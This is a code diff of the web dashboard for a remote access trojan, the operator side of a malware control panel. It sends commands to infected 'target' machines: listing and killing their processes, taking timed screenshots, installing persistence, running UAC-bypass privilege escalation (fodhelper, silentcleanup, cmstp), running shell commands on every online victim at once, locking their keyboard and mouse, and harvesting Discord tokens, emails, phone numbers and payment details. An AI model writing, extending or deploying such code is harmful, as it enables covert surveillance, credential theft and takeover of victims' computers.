+      ${d.disks?d.disks.map(dk=>`<div class="si-card"><div class="si-label">Disk ${esc(dk.device)}</div><div class="si-value">${dk.percent}% used</div><div class="progress-bar"><div class="progress-fill ${cc(dk.percent)}" style="width:${dk.percent}%"></div></div></div>`).join(''):''}
     </div>`;
-  } else { document.getElementById('sysinfo-content').innerHTML=`<div class="no-data" style="color:var(--warn)">Error: ${esc(res.msg)}</div>`; }
+  } else { document.getElementById('sysinfo-content').innerHTML=`<div class="no-data" style="color:var(--amber)">Error: ${esc(res.msg)}</div>`; }
 }
 
 // ── Processes ──
 async function getProcesses(){
   document.getElementById('proc-content').innerHTML='<div class="loading">Loading...</div>';
-  const res=await sendCmdRaw('processes');
-  if(res.status==='ok'){ allProcs=res.data; renderProcs(allProcs); }
-  else document.getElementById('proc-content').innerHTML=`<div class="no-data" style="color:var(--warn)">Error: ${esc(res.msg)}</div>`;
+  const res=await sendCmdRaw('process_list');
+  if(res.status==='ok'){
+    allProcs=res.data||[];
+    renderProcs(allProcs);
+  } else { document.getElementById('proc-content').innerHTML=`<div class="no-data" style="color:var(--amber)">Error: ${esc(res.msg)}</div>`; }
 }
-function filterProcs(){ const q=document.getElementById('proc-filter').value.toLowerCase(); renderProcs(allProcs.filter(p=>(p.name||'').toLowerCase().includes(q)||String(p.pid).includes(q))); }
+function filterProcs(){
+  const q=document.getElementById('proc-filter').value.toLowerCase();
+  renderProcs(allProcs.filter(p=>p.name.toLowerCase().includes(q)||String(p.pid).includes(q)));
+}
 function renderProcs(procs){
-  document.getElementById('proc-content').innerHTML=`<table class="proc-table"><thead><tr><th>PID</th><th>Name</th><th>CPU%</th><th>MEM%</th><th>Status</th><th></th></tr></thead><tbody>${procs.map(p=>`<tr><td style="color:var(--dim)">${p.pid}</td><td>${esc(p.name||'')}</td><td style="color:${(p.cpu_percent||0)>20?'var(--warn)':'var(--text)'}">${(p.cpu_percent||0).toFixed(1)}</td><td>${(p.memory_percent||0).toFixed(1)}</td><td style="color:var(--dim);font-size:10px">${esc(p.status||'')}</td><td><button class="btn btn-red btn-sm" onclick="killProc(${p.pid})">KILL</button></td></tr>`).join('')}</tbody></table>`;
+  if(!procs||!procs.length){document.getElementById('proc-content').innerHTML='<div class="no-data">No processes</div>';return;}
+  document.getElementById('proc-content').innerHTML=`<table class="proc-table">
+    <thead><tr><th>PID</th><th>Name</th><th>CPU%</th><th>MEM%</th><th>Action</th></tr></thead>
+    <tbody>${procs.map(p=>`<tr>
+      <td style="font-family:var(--mono);color:var(--muted);">${p.pid}</td>
+      <td style="font-weight:500;">${esc(p.name)}</td>
+      <td style="font-family:var(--mono);color:${p.cpu_percent>20?'var(--amber)':'var(--text)'};">${p.cpu_percent||0}%</td>
+      <td style="font-family:var(--mono);">${p.memory_percent?p.memory_percent.toFixed(1)+'%':'—'}</td>
+      <td><button class="btn btn-red btn-sm" onclick="killProc(${p.pid},'${esc2(p.name)}')">Kill</button></td>
+    </tr>`).join('')}</tbody>
+  </table>`;
 }
-async function killProc(pid){
-  if(!confirm(`Kill PID ${pid}?`)) return;
+async function killProc(pid,name){
+  if(!confirm(`Kill process: ${name} (PID ${pid})?`)) return;
   const res=await sendCmdRaw('kill_process',{pid});
-  addLog(res.status==='ok'?`Killed PID ${pid}`:`Kill failed: ${res.msg}`, res.status==='ok'?'info':'error');
-  getProcesses();
+  addLog(res.status==='ok'?`Killed ${name} (${pid})`:`Kill failed: ${res.msg}`, res.status==='ok'?'info':'error');
+  if(res.status==='ok') getProcesses();
 }
 
 // ── Auto Screenshots ──
 function startAutoSS(){
   if(!selectedClient) return;
+  autoSS=true;
   const interval=parseInt(document.getElementById('ss-interval').value)||30;
-  autoSS=true; sendCmd('auto_ss_start',{interval});
+  sendCmd('auto_screenshot_start',{interval});
   document.getElementById('btn-ss-start').disabled=true;
   document.getElementById('btn-ss-stop').disabled=false;
-  document.getElementById('ss-status').textContent='ACTIVE every '+interval+'s';
-  document.getElementById('ss-status').style.color='var(--accent)';
+  document.getElementById('ss-status').textContent='● RUNNING (every '+interval+'s)';
+  document.getElementById('ss-status').style.color='var(--green)';
 }
 function stopAutoSS(){
-  autoSS=false; sendCmd('auto_ss_stop');
+  autoSS=false;
+  sendCmd('auto_screenshot_stop');
   document.getElementById('btn-ss-start').disabled=false;
   document.getElementById('btn-ss-stop').disabled=true;
   document.getElementById('ss-status').textContent='STOPPED';
-  document.getElementById('ss-status').style.color='var(--dim)';
+  document.getElementById('ss-status').style.color='var(--muted)';
 }
-function clearAutoSS(){ const g=document.getElementById('ss-gallery'); g.innerHTML='<div class="no-data" style="grid-column:1/-1;">Screenshots will appear here</div>'; }
+function clearAutoSS(){
+  document.getElementById('ss-gallery').innerHTML='<div class="no-data" style="grid-column:1/-1;">Screenshots will appear here</div>';
+}
 
 // ── Chat ──
-let chatSessionOpen = false;
-socket.on('chat_reply', data => {
-  if(!selectedClient || data.client_id !== selectedClient.id) return;
-  appendChatMsg('them', data.msg);
-});
 function openChatSession(){
   if(!selectedClient) return;
-  chatSessionOpen = true;
-  sendCmdRaw('chat_open', {msg: 'Chat session started. You can type below.'}).then(res => {
-    if(res.status === 'ok'){
-      document.getElementById('btn-chat-open').disabled = true;
-      document.getElementById('btn-chat-close').disabled = false;
-      document.getElementById('chat-input').disabled = false;
-      document.getElementById('btn-chat-send').disabled = false;
-      document.getElementById('chat-session-status').textContent = '● SESSION ACTIVE';
-      document.getElementById('chat-session-status').style.color = 'var(--accent)';
-      document.getElementById('chat-messages').innerHTML = '';
-      appendChatMsg('sys', '— Session opened —');
-      document.getElementById('chat-input').focus();
-    } else { addLog('Chat open failed: '+res.msg,'error'); }
-  });
+  sendCmd('chat_open');
+  document.getElementById('btn-chat-open').disabled=true;
+  document.getElementById('btn-chat-close').disabled=false;
+  document.getElementById('chat-input').disabled=false;
+  document.getElementById('btn-chat-send').disabled=false;
+  document.getElementById('chat-session-status').textContent='SESSION ACTIVE';
+  document.getElementById('chat-session-status').style.color='var(--green)';
+  addLog('Chat session opened on '+selectedClient.hostname,'info');
 }
 function closeChatSession(){
-  if(!selectedClient) return;
-  chatSessionOpen = false; sendCmd('chat_close');
-  document.getElementById('btn-chat-open').disabled = false;
-  document.getElementById('btn-chat-close').disabled = true;
-  document.getElementById('chat-input').disabled = true;
-  document.getElementById('btn-chat-send').disabled = true;
-  document.getElementById('chat-session-status').textContent = 'NO ACTIVE SESSION';
-  document.getElementById('chat-session-status').style.color = 'var(--dim)';
-  appendChatMsg('sys', '— Session closed —');
+  sendCmd('chat_close');
+  document.getElementById('btn-chat-open').disabled=false;
+  document.getElementById('btn-chat-close').disabled=true;
+  document.getElementById('chat-input').disabled=true;
+  document.getElementById('btn-chat-send').disabled=true;
+  document.getElementById('chat-session-status').textContent='CLOSED';
+  document.getElementById('chat-session-status').style.color='var(--muted)';
 }
-async function sendChat(){
-  const inp = document.getElementById('chat-input');
-  const msg = inp.value.trim();
-  if(!msg || !selectedClient || !chatSessionOpen) return;
-  inp.value = ''; appendChatMsg('me', msg);
-  const res = await sendCmdRaw('chat_msg', {msg});
-  if(res.status !== 'ok') appendChatMsg('sys', '⚠ Delivery failed: '+(res.msg||'unknown'));
-}
-function appendChatMsg(type, text){
-  const container = document.getElementById('chat-messages');
-  const noData = container.querySelector('.no-data');
-  if(noData) noData.remove();
-  const div = document.createElement('div');
-  div.className = 'chat-msg chat-msg-'+type;
-  const time = new Date().toTimeString().slice(0,8);
-  const label = type==='me'?'YOU':type==='them'?'TARGET':'—';
-  div.innerHTML = type === 'sys'
-    ? `<div class="cm-sys">${esc(text)}</div>`
-    : `<div class="cm-header"><span class="cm-label-${type}">${label}</span><span class="cm-time">${time}</span></div><div class="cm-text">${esc(text)}</div>`;
-  container.appendChild(div);
-  container.scrollTop = container.scrollHeight;
+function sendChat(){
+  const inp=document.getElementById('chat-input');
+  const msg=inp.value.trim();
+  if(!msg||!selectedClient) return;
+  sendCmd('chat_send',{msg});
+  const msgs=document.getElementById('chat-messages');
+  const div=document.createElement('div');
+  div.className='chat-msg chat-msg-me';
+  div.innerHTML=`<div class="cm-header"><span class="cm-label-me">YOU</span><span class="cm-time">${new Date().toTimeString().slice(0,8)}</span></div><div class="cm-text">${esc(msg)}</div>`;
+  msgs.appendChild(div); msgs.scrollTop=msgs.scrollHeight;
+  inp.value='';
 }
 
 // ── Persist ──
@@ -1605,142 +2097,88 @@ async function persistInstall(){
   if(!selectedClient) return;
   document.getElementById('persist-result').textContent='Installing...';
   const res=await sendCmdRaw('persist_install');
-  document.getElementById('persist-result').innerHTML=`<span style="color:${res.status==='ok'?'var(--accent)':'var(--warn)'}">${esc(res.msg)}</span>`;
+  document.getElementById('persist-result').textContent=res.msg||(res.status==='ok'?'Installed':'Error');
+  document.getElementById('persist-result').style.color=res.status==='ok'?'var(--green)':'var(--red)';
 }
 async function persistRemove(){
   if(!selectedClient) return;
   document.getElementById('persist-result').textContent='Removing...';
   const res=await sendCmdRaw('persist_remove');
-  document.getElementById('persist-result').innerHTML=`<span style="color:${res.status==='ok'?'var(--accent)':'var(--warn)'}">${esc(res.msg)}</span>`;
+  document.getElementById('persist-result').textContent=res.msg||(res.status==='ok'?'Removed':'Error');
+  document.getElementById('persist-result').style.color=res.status==='ok'?'var(--green)':'var(--red)';
 }
 
-// ── Privesc ──
-function _privescLog(msg, color){
-  const el=document.getElementById('privesc-result');
-  el.innerHTML+=`<span style="color:var(--dim)">[${new Date().toTimeString().slice(0,8)}]</span> <span style="color:${color||'var(--text)'}">${esc(msg)}</span>\n`;
-  el.scrollTop=el.scrollHeight;
+// ── PrivEsc ──
+async function privescRun(method){
+  if(!selectedClient) return;
+  document.getElementById('privesc-result').textContent='Running '+method+'...';
+  document.getElementById('privesc-result').style.color='var(--muted)';
+  const res=await sendCmdRaw('privesc',{method});
+  document.getElementById('privesc-result').textContent=res.msg||(res.status==='ok'?'OK':'Error');
+  document.getElementById('privesc-result').style.color=res.status==='ok'?'var(--green)':'var(--red)';
 }
 async function privescCheckAdmin(){
   if(!selectedClient) return;
-  _privescLog('Checking privileges...','var(--dim)');
-  const res=await sendCmdRaw('privesc_check');
-  _privescLog(res.msg, res.is_admin?'var(--accent)':'var(--warn)');
-}
-async function privescRun(method){
-  if(!selectedClient) return;
-  const labels={'fodhelper':'FodHelper','silentcleanup':'SilentCleanup','cmstp':'cmstp.exe'};
-  _privescLog(`Attempting ${labels[method]||method} bypass...`,'var(--accent2)');
-  const res=await sendCmdRaw('privesc_run',{method});
-  _privescLog(res.msg, res.status==='ok'?'var(--accent)':'var(--warn)');
+  const res=await sendCmdRaw('check_admin');
+  document.getElementById('privesc-result').textContent=res.msg||JSON.stringify(res);
+  document.getElementById('privesc-result').style.color=res.is_admin?'var(--green)':'var(--amber)';
 }
 
-// ── Admin ──
+// ── Admin Cmd ──
 async function adminCmd(action){
   if(!selectedClient) return;
-  const el = document.getElementById('admin-result');
-  const time = new Date().toTimeString().slice(0,8);
-  el.innerHTML += `<span style="color:var(--dim)">[${time}]</span> <span style="color:var(--accent2)">${esc(action)}</span> — sending...\n`;
-  el.scrollTop = el.scrollHeight;
-  const res = await sendCmdRaw(action);
-  const color = res.status==='ok' ? 'var(--accent)' : 'var(--warn)';
-  el.innerHTML += `<span style="color:var(--dim)">[${time}]</span> <span style="color:${color}">${esc(res.msg||res.status)}</span>\n`;
-  el.scrollTop = el.scrollHeight;
+  document.getElementById('admin-result').textContent='Running...';
+  const res=await sendCmdRaw(action);
+  const r=document.getElementById('admin-result');
+  r.textContent=(res.msg||res.status)+'\n'+r.textContent;
+  r.style.color=res.status==='ok'?'var(--green)':'var(--red)';
 }
 
-// ── Play Media (HTTP upload — avoids WS size limit & logout) ──
-async function sendMedia(unclosable) {
-  if (!selectedClient) return;
-  const fileInput = document.getElementById('media-file');
-  const statusEl  = document.getElementById('media-status');
-  const progressBar  = document.getElementById('upload-progress');
-  const progressFill = document.getElementById('upload-progress-fill');
-
-  if (!fileInput.files.length) { statusEl.textContent = '✘ No file selected'; return; }
-
-  const file = fileInput.files[0];
-  const ext  = file.name.split('.').pop().toLowerCase();
-  const rid  = Math.random().toString(36).slice(2);
-
-  // Disable buttons while uploading
-  document.querySelectorAll('.btn-purple,.btn-red').forEach(b => b.disabled = true);
-  statusEl.textContent = 'Uploading...';
-  progressBar.style.display = 'block';
-  progressFill.style.width = '0%';
-
-  // Register pending listener BEFORE the upload so we never miss the response
-  const agentReply = new Promise(resolve => {
-    pendingCmds[rid] = resolve;
-    setTimeout(() => {
-      if (pendingCmds[rid]) { delete pendingCmds[rid]; resolve({ status: 'error', msg: 'Timeout waiting for agent' }); }
-    }, 90000);  // 90 s for large files
-  });
-
-  try {
-    // Use XMLHttpRequest so we get upload progress events
-    const uploadResult = await new Promise((resolve, reject) => {
-      const xhr = new XMLHttpRequest();
-      xhr.open('POST', `/upload_media/${selectedClient.id}`);
-      xhr.setRequestHeader('X-Dashboard-Token', _dashboardToken);
-
-      xhr.upload.onprogress = e => {
-        if (e.lengthComputable) {
-          const pct = Math.round((e.loaded / e.total) * 100);
-          progressFill.style.width = pct + '%';
-          statusEl.textContent = `Uploading... ${pct}%`;
-        }
-      };
-
-      xhr.onload = () => {
-        try { resolve(JSON.parse(xhr.responseText)); }
-        catch(e) { reject(new Error('Bad server response')); }
-      };
-      xhr.onerror = () => reject(new Error('Network error during upload'));
-
-      const form = new FormData();
-      form.append('file',       file);
-      form.append('ext',        ext);
-      form.append('unclosable', unclosable ? 'true' : 'false');
-      form.append('rid',        rid);
-      xhr.send(form);
-    });
-
-    if (uploadResult.status !== 'ok') {
-      statusEl.textContent = '✘ Upload failed: ' + uploadResult.msg;
-      delete pendingCmds[rid];
-      return;
-    }
-
-    progressFill.style.width = '100%';
-    statusEl.textContent = 'Sent — waiting for agent...';
-
-    const res = await agentReply;
-    statusEl.textContent = res.status === 'ok'
-      ? '✔ ' + (res.msg || 'Playing')
-      : '✘ ' + (res.msg || 'Agent error');
-
-  } catch (err) {
-    statusEl.textContent = '✘ ' + err.message;
-    delete pendingCmds[rid];
-  } finally {
-    document.querySelectorAll('.btn-purple,.btn-red').forEach(b => b.disabled = false);
-    setTimeout(() => { progressBar.style.display = 'none'; progressFill.style.width = '0%'; }, 2000);
-  }
+// ── Media upload ──
+async function sendMedia(unclosable){
+  if(!selectedClient){ addLog('No client selected','error'); return; }
+  const fileInput=document.getElementById('media-file');
+  const file=fileInput.files[0];
+  if(!file){ addLog('No file selected','error'); return; }
+  const ext=file.name.split('.').pop().toLowerCase();
+  const rid=Math.random().toString(36).slice(2);
+  const status=document.getElementById('media-status');
+  status.textContent='Uploading...';
+  status.style.color='var(--muted)';
+  const progressBar=document.getElementById('upload-progress');
+  const progressFill=document.getElementById('upload-progress-fill');
+  progressBar.style.display='block';
+  progressFill.style.width='0%';
+  const formData=new FormData();
+  formData.append('file',file);
+  formData.append('ext',ext);
+  formData.append('unclosable',unclosable?'true':'false');
+  formData.append('rid',rid);
+  try{
+    const xhr=new XMLHttpRequest();
+    xhr.upload.onprogress=e=>{ if(e.lengthComputable){ progressFill.style.width=(e.loaded/e.total*100)+'%'; } };
+    await new Promise((resolve,reject)=>{ xhr.onload=resolve; xhr.onerror=reject; xhr.open('POST','/upload_media/'+selectedClient.id); xhr.setRequestHeader('X-Dashboard-Token',_dashboardToken); xhr.send(formData); });
+    if(xhr.status===200){ status.textContent='Sent!'; status.style.color='var(--green)'; addLog('Media sent to '+selectedClient.hostname,'info'); }
+    else { const err=JSON.parse(xhr.responseText); status.textContent='Error: '+(err.msg||xhr.status); status.style.color='var(--red)'; }
+  } catch(e){ status.textContent='Upload failed'; status.style.color='var(--red)'; }
+  progressBar.style.display='none';
+  progressFill.style.width='0%';
 }
 
 // ── Mass Cmd ──
 function openMassCmd(){ document.getElementById('mass-overlay').classList.add('open'); }
-document.getElementById('mass-overlay').addEventListener('click',e=>{ if(e.target===document.getElementById('mass-overlay')) document.getElementById('mass-overlay').classList.remove('open'); });
 async function runMassCmd(){
   const action=document.getElementById('mass-action').value;
-  const param=document.getElementById('mass-param').value.trim();
-  const online=clients.filter(c=>c.status==='online');
-  if(!online.length){ alert('No online nodes'); return; }
+  const param=document.getElementById('mass-param').value;
   const results=document.getElementById('mass-results');
-  results.innerHTML='<div class="loading">Executing on '+online.length+' nodes...</div>';
+  const online=clients.filter(c=>c.status==='online');
+  if(!online.length){ results.innerHTML='<div class="no-data">No online clients</div>'; return; }
+  results.innerHTML='<div class="loading">Running on '+online.length+' client(s)...</div>';
   const extra={};
   if(action==='shell') extra.cmd=param;
   else if(action==='alert') extra.msg=param;
   else if(action==='open_url') extra.url=param;
+  const savedClient=selectedClient;
   const jobs=online.map(c=>{
     return new Promise(resolve=>{
       const rid=Math.random().toString(36).slice(2);
@@ -1750,107 +2188,82 @@ async function runMassCmd(){
     }).then(res=>({...res,_host:c.hostname}));
   });
   const all=await Promise.all(jobs);
+  selectedClient=savedClient;
   results.innerHTML=all.map(r=>`<div class="mass-result">
-    <div class="mr-host">${esc(r._host)} <span style="color:${r.status==='ok'?'var(--accent)':'var(--warn)'}">[${r.status}]</span></div>
+    <div class="mr-host">${esc(r._host)} <span style="color:${r.status==='ok'?'var(--green)':'var(--red)'}">[${r.status}]</span></div>
     ${r.stdout?`<div class="mr-out">${esc(r.stdout)}</div>`:''}
     ${r.stderr?`<div class="mr-err">${esc(r.stderr)}</div>`:''}
     ${r.msg?`<div class="${r.status==='ok'?'mr-out':'mr-err'}">${esc(r.msg)}</div>`:''}
   </div>`).join('');
 }
 
-
 // ── Disable KB+Mouse ──
 let inputDisabled = false;
-function toggleDisableInput(on){
-  if(!selectedClient){
-    document.getElementById('disable-input-toggle').checked = false;
-    return;
-  }
-  inputDisabled = on;
-  sendCmd(on ? 'input_disable' : 'input_enable');
-  addLog((on ? 'Disabled' : 'Enabled') + ' keyboard & mouse on ' + selectedClient.hostname, 'info');
+function toggleDisableInput2(on){
+  if(!selectedClient){ document.getElementById('disable-input-toggle').checked=false; return; }
+  inputDisabled=on;
+  sendCmd(on?'input_disable':'input_enable');
+  addLog((on?'Disabled':'Enabled')+' keyboard & mouse on '+selectedClient.hostname,'info');
 }
 
 // ── Discord Grab ──
 async function runDiscordGrab(){
   if(!selectedClient) return;
-  const status = document.getElementById('discord-grab-status');
-  const results = document.getElementById('discord-results');
-  status.textContent = '● RUNNING...';
-  status.style.color = 'var(--accent)';
-  results.innerHTML = '<div style="font-size:11px;color:var(--dim);animation:pulse 1.5s infinite;">Harvesting tokens...</div>';
-  const res = await sendCmdRaw('discord_grab');
-  status.textContent = res.status === 'ok' ? 'DONE' : 'ERROR';
-  status.style.color = res.status === 'ok' ? 'var(--accent)' : 'var(--danger)';
-  if(res.status !== 'ok'){
-    results.innerHTML = `<div style="color:var(--danger);font-size:12px;">Error: ${esc(res.msg)}</div>`;
-    return;
-  }
-  const accounts = res.data || [];
-  if(!accounts.length){
-    results.innerHTML = '<div style="font-size:11px;color:var(--dim);">No tokens found on this machine.</div>';
-    return;
-  }
-  results.innerHTML = accounts.map(a => {
-    const badges = [];
-    if(a.nitro) badges.push('<span class="tag" style="color:#b388ff;border-color:rgba(179,136,255,0.4);background:rgba(179,136,255,0.08);">NITRO</span>');
-    if(a.has_payment) badges.push('<span class="tag" style="color:var(--accent);border-color:rgba(0,255,136,0.4);background:rgba(0,255,136,0.08);">💳 PAYMENT</span>');
+  const status=document.getElementById('discord-grab-status');
+  const results=document.getElementById('discord-results');
+  status.textContent='● RUNNING...';
+  status.style.color='var(--accent)';
+  results.innerHTML='<div style="font-size:11px;color:var(--muted);font-family:var(--mono);">Harvesting tokens...</div>';
+  const res=await sendCmdRaw('discord_grab');
+  status.textContent=res.status==='ok'?'DONE':'ERROR';
+  status.style.color=res.status==='ok'?'var(--green)':'var(--red)';
+  if(res.status!=='ok'){ results.innerHTML=`<div style="color:var(--red);font-size:12px;">Error: ${esc(res.msg)}</div>`; return; }
+  const accounts=res.data||[];
+  if(!accounts.length){ results.innerHTML='<div style="font-size:11px;color:var(--muted);">No tokens found on this machine.</div>'; return; }
+  results.innerHTML=accounts.map(a=>{
+    const badges=[];
+    if(a.nitro) badges.push('<span class="tag" style="color:var(--purple);border-color:rgba(124,58,237,0.3);background:var(--purple-dim);">NITRO</span>');
+    if(a.has_payment) badges.push('<span class="tag tag-green">💳 PAYMENT</span>');
     if(a.mfa) badges.push('<span class="tag tag-blue">2FA</span>');
-    return `<div style="background:var(--panel2);border:1px solid var(--border);padding:14px 16px;margin-bottom:10px;">
+    return `<div style="background:var(--surface2);border:1px solid var(--border2);border-radius:var(--radius);padding:14px 16px;margin-bottom:10px;">
       <div style="display:flex;align-items:center;gap:10px;margin-bottom:10px;">
-        ${a.avatar ? `<img src="${esc(a.avatar)}" style="width:38px;height:38px;border-radius:50%;border:1px solid var(--border);">` : '<div style="width:38px;height:38px;border-radius:50%;background:var(--border);"></div>'}
+        ${a.avatar?`<img src="${esc(a.avatar)}" style="width:38px;height:38px;border-radius:50%;border:1px solid var(--border);">` : '<div style="width:38px;height:38px;border-radius:50%;background:var(--border);"></div>'}
         <div style="flex:1;">
-          <div style="color:var(--accent2);font-size:13px;font-weight:bold;">${esc(a.username)}</div>
-          <div style="color:var(--dim);font-size:10px;">${esc(a.id)} · ${esc(a.platform)}</div>
+          <div style="color:var(--accent);font-size:13px;font-weight:bold;">${esc(a.username)}</div>
+          <div style="color:var(--muted);font-size:10px;font-family:var(--mono);">${esc(a.id)} · ${esc(a.platform)}</div>
         </div>
         <div style="display:flex;gap:5px;flex-wrap:wrap;">${badges.join('')}</div>
       </div>
       <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;font-size:11px;margin-bottom:10px;">
-        <div><span style="color:var(--dim);">Email: </span><span style="color:var(--text);">${esc(a.email||'—')}</span></div>
-        <div><span style="color:var(--dim);">Phone: </span><span style="color:var(--text);">${esc(a.phone||'—')}</span></div>
-        <div><span style="color:var(--dim);">Locale: </span><span style="color:var(--text);">${esc(a.locale||'—')}</span></div>
-        <div><span style="color:var(--dim);">Guilds: </span><span style="color:var(--accent);">${a.guild_count||0}</span></div>
-        ${a.nitro_expiry ? `<div style="grid-column:span 2"><span style="color:var(--dim);">Nitro until: </span><span style="color:var(--purple);">${esc(a.nitro_expiry)}</span></div>` : ''}
-        ${a.payment_info ? `<div style="grid-column:span 2"><span style="color:var(--dim);">Payment: </span><span style="color:var(--accent);">${esc(a.payment_info)}</span></div>` : ''}
-        ${a.boosts ? `<div style="grid-column:span 2"><span style="color:var(--dim);">Boosts: </span><span style="color:var(--purple);">${esc(a.boosts)}</span></div>` : ''}
+        <div><span style="color:var(--muted);">Email: </span><span>${esc(a.email||'—')}</span></div>
+        <div><span style="color:var(--muted);">Phone: </span><span>${esc(a.phone||'—')}</span></div>
+        <div><span style="color:var(--muted);">Locale: </span><span>${esc(a.locale||'—')}</span></div>
+        <div><span style="color:var(--muted);">Guilds: </span><span style="color:var(--accent);">${a.guild_count||0}</span></div>
+        ${a.nitro_expiry?`<div style="grid-column:span 2"><span style="color:var(--muted);">Nitro until: </span><span style="color:var(--purple);">${esc(a.nitro_expiry)}</span></div>`:''}
+        ${a.payment_info?`<div style="grid-column:span 2"><span style="color:var(--muted);">Payment: </span><span style="color:var(--green);">${esc(a.payment_info)}</span></div>`:''}
       </div>
-      <div style="background:#050810;border:1px solid var(--border);padding:8px 10px;font-size:10px;color:var(--warn);word-break:break-all;margin-bottom:8px;">${esc(a.token)}</div>
-      <button class="btn btn-blue btn-sm" onclick="navigator.clipboard.writeText('${esc2(a.token)}')">COPY TOKEN</button>
-      ${a.admin_guilds && a.admin_guilds.length ? `
-      <div style="margin-top:10px;">
-        <div style="font-size:9px;letter-spacing:2px;color:var(--dim);margin-bottom:5px;text-transform:uppercase;">Admin/Owner Guilds</div>
-        ${a.admin_guilds.map(g=>`<div style="font-size:10px;color:var(--text);padding:3px 0;border-bottom:1px solid rgba(26,35,50,0.4);">${esc(g.name)} <span style="color:var(--dim);">(${g.members} members${g.vanity?' · .gg/'+g.vanity:''})</span></div>`).join('')}
-      </div>` : ''}
+      <div style="background:#0f1117;border:1px solid var(--border2);border-radius:6px;padding:8px 10px;font-size:10px;color:#f59e0b;word-break:break-all;margin-bottom:8px;font-family:var(--mono);">${esc(a.token)}</div>
+      <button class="btn btn-blue btn-sm" onclick="navigator.clipboard.writeText('${esc2(a.token)}')">Copy Token</button>
     </div>`;
   }).join('');
 }
 function clearDiscordResults(){
-  document.getElementById('discord-results').innerHTML = '<div style="font-size:11px;color:var(--dim);">No results yet — click GRAB to harvest tokens.</div>';
-  document.getElementById('discord-grab-status').textContent = '';
+  document.getElementById('discord-results').innerHTML='<div style="font-size:11px;color:var(--muted);">No results yet — click GRAB to harvest tokens.</div>';
+  document.getElementById('discord-grab-status').textContent='';
 }
 
 // ── Power Controls ──
 async function powerAction(action){
   if(!selectedClient) return;
-  const resultEl = document.getElementById('power-result');
-  const labels = {
-    shutdown:        'Force shutting down...',
-    restart:         'Force restarting...',
-    sleep:           'Sending to sleep...',
-    hibernate:       'Hibernating...',
-    logoff:          'Logging off...',
-    shutdown_timed:  'Scheduling timed shutdown...',
-    shutdown_cancel: 'Cancelling timed shutdown...',
-  };
-  resultEl.style.color = 'var(--dim)';
-  resultEl.textContent = labels[action] || 'Sending command...';
-  const extra = {};
-  if(action === 'shutdown_timed'){
-    extra.delay = parseInt(document.getElementById('shutdown-delay').value) || 60;
-  }
-  const res = await sendCmdRaw('power_' + action, extra);
-  resultEl.style.color = res.status === 'ok' ? 'var(--accent)' : 'var(--danger)';
-  resultEl.textContent = res.msg || (res.status === 'ok' ? 'Done' : 'Error');
+  const resultEl=document.getElementById('power-result');
+  const labels={shutdown:'Force shutting down...',restart:'Force restarting...',sleep:'Sending to sleep...',hibernate:'Hibernating...',logoff:'Logging off...',shutdown_timed:'Scheduling timed shutdown...',shutdown_cancel:'Cancelling timed shutdown...'};
+  resultEl.style.color='var(--muted)';
+  resultEl.textContent=labels[action]||'Sending command...';
+  const extra={};
+  if(action==='shutdown_timed'){ extra.delay=parseInt(document.getElementById('shutdown-delay').value)||60; }
+  const res=await sendCmdRaw('power_'+action,extra);
+  resultEl.style.color=res.status==='ok'?'var(--green)':'var(--red)';
+  resultEl.textContent=res.msg||(res.status==='ok'?'Done':'Error');
 }
 
 // ── Log ──
@@ -1861,8 +2274,8 @@ function addLog(msg,type='info'){
   item.innerHTML=`<div class="rlog-time">${new Date().toTimeString().slice(0,8)}</div><div class="rlog-msg ${type}">${esc(msg)}</div>`;
   log.prepend(item);
   while(log.children.length>60) log.removeChild(log.lastChild);
-  const countEl = document.getElementById('rail-count');
-  if(countEl) countEl.textContent = log.children.length;
+  const countEl=document.getElementById('rail-count');
+  if(countEl) countEl.textContent=log.children.length;
 }
 
 // ── Utils ──
